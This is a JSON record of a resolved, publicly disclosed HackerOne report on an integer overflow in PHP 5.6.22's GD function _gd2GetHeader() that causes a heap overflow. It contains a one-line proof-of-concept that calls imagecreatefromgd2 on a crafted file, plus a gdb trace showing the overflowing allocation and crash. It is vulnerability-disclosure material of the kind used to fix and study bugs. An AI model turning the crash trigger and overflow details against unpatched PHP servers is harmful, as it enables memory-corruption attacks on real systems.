{
  "id": 143234,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDMyMzQ=",
  "url": "https://hackerone.com/reports/143234",
  "title": "Integer Overflow in _gd2GetHeader() resulting in heap overflow",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-06-05T19:55:10.069Z",
  "submitted_at": "2016-06-05T19:55:10.069Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "gogil",
    "url": "/gogil",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ7UPNDVG%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T133452Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD%2FdYg8YfwvWiXy6svYJjKl%2FURKGGduuyVIXyYnoiQaLAIgR3w8yXR6ttmnDSwkbH9cCkxMI%2BSZ1jcS%2FlplDEs%2Bd2cqsgUIFhADGgwwMTM2MTkyNzQ4NDkiDJ6foeQbMNarjQZudSqPBeub2YNA0aLW68Fxu%2Fiqcgj%2FRpzrTyA4g9%2Bf7fVuhMb3XNCzZKtpMQyTtmxYZMTQnpndXDGRRTsmbGUpgNSBTRViz6CRI4BGWJKlWbxstCkbpJFvDPajIUwdnwVlYlNKtWouyaYOEce6x%2BLDj5O8Wc9RS8idg9NHzFwyUldTT4ptrBVMqj%2FMtnklXxiD85fvqqpEcWrSvjo9nd8kE3KN4GT%2BgSugnwKs%2BSKgQUEJhUkTJ3UH4dfU5JFabHtUdC78b3wWnoV%2BtToSrnI%2FnTlzVZJR2Sz2MNJ%2BeVJW9K1ODYTOOU0EJUwpjT4vQbWZxSczV9jVgDwYaiLFYwOky%2BLMPsJhWEamVFLWGfk9UVPvr3PZBg5vChguJ8iZVzvvPlYGyWYHo%2Fl%2B4WrH6YnaDf0QuphrRelXpi4ADYtnozrquyNAklExELHY6uvmMIhhtTtsCEESYAmTfps%2B6ulWcQKGfxYOXIIfjK2Em0LzLN5WGYOYhm1KsODCRBYf9id7gqX4nMgfm2pvwKK2HoeP1eFsOfdNPINvhlcwguOyhAIKhwp2NLd6TjF2VpNjbyWk56hcRedvCpQ%2BaaEYLjU%2FVVAHZuEVWDMhj89OtAn9BsLbgJ2tcu%2FpEKB%2FPG6jumWZ4my7O%2Baqh57JM2MxoS3XCd%2FMAp8hfeQ0aoD3NKssb2ma4CtJXL%2F5dr5siaje5bqzR89o5E2adB5HPphy2deyXbD3illcrUvzS29TQLZrYHubh7%2BZzEYCQriP3h9Nsl9NOtMglLIMAGu%2FzAgbLsdOKIO3%2BJRDxBxgXOBjUc4dexLHc6efO2YHVFf3tU6mJmXxcEWPaMn4AHxQuPud6NGSno97Fo0U8qWhAD%2FSfHRQ7CHFUG4wid2%2FxgY6sQF1SxCB1MKmO8w658nr1QXWUnFS59VR6HRM%2FvtudGCwB%2FUN%2BH7jgWVrclpqrHJLjLmbfAHeOAwUQVBQEaO8icCnoIzhSOv8JLbKZ32PEcTWutetuRRcnPGz6Ggqq%2BhIRRnqR3AW0OZR9v26H6DMI6yk%2BxOP%2FTiayARYd1UAqfeaiGnUGpb7BAUaeqGW8fXW%2BjRzpTvKAnBwAwPiJHt9wnRduyw5FQkItU9IPxIyGxaqEt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=108194465d4e6f68bc9f5c30540e8dd6eb9399949883d6052992b6c2525d7553",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ7UPNDVG%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T133452Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD%2FdYg8YfwvWiXy6svYJjKl%2FURKGGduuyVIXyYnoiQaLAIgR3w8yXR6ttmnDSwkbH9cCkxMI%2BSZ1jcS%2FlplDEs%2Bd2cqsgUIFhADGgwwMTM2MTkyNzQ4NDkiDJ6foeQbMNarjQZudSqPBeub2YNA0aLW68Fxu%2Fiqcgj%2FRpzrTyA4g9%2Bf7fVuhMb3XNCzZKtpMQyTtmxYZMTQnpndXDGRRTsmbGUpgNSBTRViz6CRI4BGWJKlWbxstCkbpJFvDPajIUwdnwVlYlNKtWouyaYOEce6x%2BLDj5O8Wc9RS8idg9NHzFwyUldTT4ptrBVMqj%2FMtnklXxiD85fvqqpEcWrSvjo9nd8kE3KN4GT%2BgSugnwKs%2BSKgQUEJhUkTJ3UH4dfU5JFabHtUdC78b3wWnoV%2BtToSrnI%2FnTlzVZJR2Sz2MNJ%2BeVJW9K1ODYTOOU0EJUwpjT4vQbWZxSczV9jVgDwYaiLFYwOky%2BLMPsJhWEamVFLWGfk9UVPvr3PZBg5vChguJ8iZVzvvPlYGyWYHo%2Fl%2B4WrH6YnaDf0QuphrRelXpi4ADYtnozrquyNAklExELHY6uvmMIhhtTtsCEESYAmTfps%2B6ulWcQKGfxYOXIIfjK2Em0LzLN5WGYOYhm1KsODCRBYf9id7gqX4nMgfm2pvwKK2HoeP1eFsOfdNPINvhlcwguOyhAIKhwp2NLd6TjF2VpNjbyWk56hcRedvCpQ%2BaaEYLjU%2FVVAHZuEVWDMhj89OtAn9BsLbgJ2tcu%2FpEKB%2FPG6jumWZ4my7O%2Baqh57JM2MxoS3XCd%2FMAp8hfeQ0aoD3NKssb2ma4CtJXL%2F5dr5siaje5bqzR89o5E2adB5HPphy2deyXbD3illcrUvzS29TQLZrYHubh7%2BZzEYCQriP3h9Nsl9NOtMglLIMAGu%2FzAgbLsdOKIO3%2BJRDxBxgXOBjUc4dexLHc6efO2YHVFf3tU6mJmXxcEWPaMn4AHxQuPud6NGSno97Fo0U8qWhAD%2FSfHRQ7CHFUG4wid2%2FxgY6sQF1SxCB1MKmO8w658nr1QXWUnFS59VR6HRM%2FvtudGCwB%2FUN%2BH7jgWVrclpqrHJLjLmbfAHeOAwUQVBQEaO8icCnoIzhSOv8JLbKZ32PEcTWutetuRRcnPGz6Ggqq%2BhIRRnqR3AW0OZR9v26H6DMI6yk%2BxOP%2FTiayARYd1UAqfeaiGnUGpb7BAUaeqGW8fXW%2BjRzpTvKAnBwAwPiJHt9wnRduyw5FQkItU9IPxIyGxaqEt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c30e155d4ec7b171c54baa37e532827dae6f8a351644704cceda8290ef52920c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T09:34:58.187Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T09:34:48.114Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The _gd2GetHeader() is prone to an integer overflow, which result in heap based overflow.\n\nTested on PHP 5.6.22\n\n--------------- PoC ---------------\n$ ls\npoc.gd   poc.php\n$ cat poc.php\n<?php imagecreatefromgd2(\"poc.gd\"); ?>\n\n\n--------------- Result ---------------\n/php$ gdb -q --args ./php-5.6.22/sapi/cli/php poc.php\nReading symbols from /php/php-5.6.22/sapi/cli/php...done.\n(gdb) b gd_gd2.c:139\nBreakpoint 1 at 0x570869: file /php/php-5.6.22/ext/gd/libgd/gd_gd2.c, line 139.\n(gdb) r\nStarting program: /php/./php-5.6.22/sapi/cli/php poc.php\n\nBreakpoint 1, _gd2GetHeader (in=0x7ffff7fd0ac0, sx=0x7fffffffa520, \n    sy=0x7fffffffa524, cs=0x7fffffffa530, vers=0x7fffffffa534, \n    fmt=0x7fffffffa538, ncx=0x7fffffffa528, ncy=0x7fffffffa52c, \n    chunkIdx=0x7fffffffa540) at /php/php-5.6.22/ext/gd/libgd/gd_gd2.c:139\n139\t\t\tnc = (*ncx) * (*ncy);      <---------- ncx(Chunks wide) is 0x5b00, ncy(Chunks high) is 0x5b00\n<---------- As a result, 'nc' is 0x20590000.\n\n(gdb) x/xw ncx\n0x7fffffffa528:\t0x00005b00\n(gdb) x/xw ncy\n0x7fffffffa52c:\t0x00005b00\n(gdb) n\n141\t\t\tsidx = sizeof(t_chunk_info) * nc;      <---------- sizeof(t_chunk_info) is 0x8.\n<---------- The result of the multiplication can overflow.\n\n(gdb) n\n142\t\t\tif (sidx <= 0) {\n(gdb) n\n145\t\t\tcidx = gdCalloc(sidx, 1);     <---------- gdCalloc() call will allocate a buffer too small to contain the chunk entries.\n(gdb) info locals\nsidx = 46661632 (0x2C80000)\nnc = 542703616 (0x20590000)\n...\n(gdb) n\n146\t\t\tfor (i = 0; i < nc; i++) {\n(gdb) n\n145\t\t\tcidx = gdCalloc(sidx, 1);\n(gdb) n\n146\t\t\tfor (i = 0; i < nc; i++) {\n(gdb) n\n147\t\t\t\tif (gdGetInt(&cidx[i].offset, in) != 1) {    <---------- It cause heap overflow\n(gdb) n\n151\t\t\t\tif (gdGetInt(&cidx[i].size, in) != 1) {\n(gdb) n\n155\t\t\t\tif (cidx[i].offset < 0 || cidx[i].size < 0) {\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\nphp_gd_gdGetInt (result=result@entry=0x7ffff6116000, \n    ctx=ctx@entry=0x7ffff7fd0ac0) at /php/php-5.6.22/ext/gd/libgd/gd_io.c:103\n103\t\t*result = r << 24;\n(gdb) \n\n",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 97992,
      "file_name": "poc.zip",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/992/d8f3388d3ea6afc4d710d3bb7083074690eb207c/poc.zip?response-content-disposition=attachment%3B%20filename%3D%22poc.zip%22%3B%20filename%2A%3DUTF-8%27%27poc.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ7UPNDVG%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T133452Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD%2FdYg8YfwvWiXy6svYJjKl%2FURKGGduuyVIXyYnoiQaLAIgR3w8yXR6ttmnDSwkbH9cCkxMI%2BSZ1jcS%2FlplDEs%2Bd2cqsgUIFhADGgwwMTM2MTkyNzQ4NDkiDJ6foeQbMNarjQZudSqPBeub2YNA0aLW68Fxu%2Fiqcgj%2FRpzrTyA4g9%2Bf7fVuhMb3XNCzZKtpMQyTtmxYZMTQnpndXDGRRTsmbGUpgNSBTRViz6CRI4BGWJKlWbxstCkbpJFvDPajIUwdnwVlYlNKtWouyaYOEce6x%2BLDj5O8Wc9RS8idg9NHzFwyUldTT4ptrBVMqj%2FMtnklXxiD85fvqqpEcWrSvjo9nd8kE3KN4GT%2BgSugnwKs%2BSKgQUEJhUkTJ3UH4dfU5JFabHtUdC78b3wWnoV%2BtToSrnI%2FnTlzVZJR2Sz2MNJ%2BeVJW9K1ODYTOOU0EJUwpjT4vQbWZxSczV9jVgDwYaiLFYwOky%2BLMPsJhWEamVFLWGfk9UVPvr3PZBg5vChguJ8iZVzvvPlYGyWYHo%2Fl%2B4WrH6YnaDf0QuphrRelXpi4ADYtnozrquyNAklExELHY6uvmMIhhtTtsCEESYAmTfps%2B6ulWcQKGfxYOXIIfjK2Em0LzLN5WGYOYhm1KsODCRBYf9id7gqX4nMgfm2pvwKK2HoeP1eFsOfdNPINvhlcwguOyhAIKhwp2NLd6TjF2VpNjbyWk56hcRedvCpQ%2BaaEYLjU%2FVVAHZuEVWDMhj89OtAn9BsLbgJ2tcu%2FpEKB%2FPG6jumWZ4my7O%2Baqh57JM2MxoS3XCd%2FMAp8hfeQ0aoD3NKssb2ma4CtJXL%2F5dr5siaje5bqzR89o5E2adB5HPphy2deyXbD3illcrUvzS29TQLZrYHubh7%2BZzEYCQriP3h9Nsl9NOtMglLIMAGu%2FzAgbLsdOKIO3%2BJRDxBxgXOBjUc4dexLHc6efO2YHVFf3tU6mJmXxcEWPaMn4AHxQuPud6NGSno97Fo0U8qWhAD%2FSfHRQ7CHFUG4wid2%2FxgY6sQF1SxCB1MKmO8w658nr1QXWUnFS59VR6HRM%2FvtudGCwB%2FUN%2BH7jgWVrclpqrHJLjLmbfAHeOAwUQVBQEaO8icCnoIzhSOv8JLbKZ32PEcTWutetuRRcnPGz6Ggqq%2BhIRRnqR3AW0OZR9v26H6DMI6yk%2BxOP%2FTiayARYd1UAqfeaiGnUGpb7BAUaeqGW8fXW%2BjRzpTvKAnBwAwPiJHt9wnRduyw5FQkItU9IPxIyGxaqEt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=34641f61eb1478cfd3cee4be0b2d4324dcf0ff42ffb27812b4ae71a9402e1b72",
      "file_size": 75800,
      "type": "application/zip",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2019-11-12T09:34:48.185Z",
  "allow_singular_disclosure_after": -184910404.59263688,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "dyabla"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
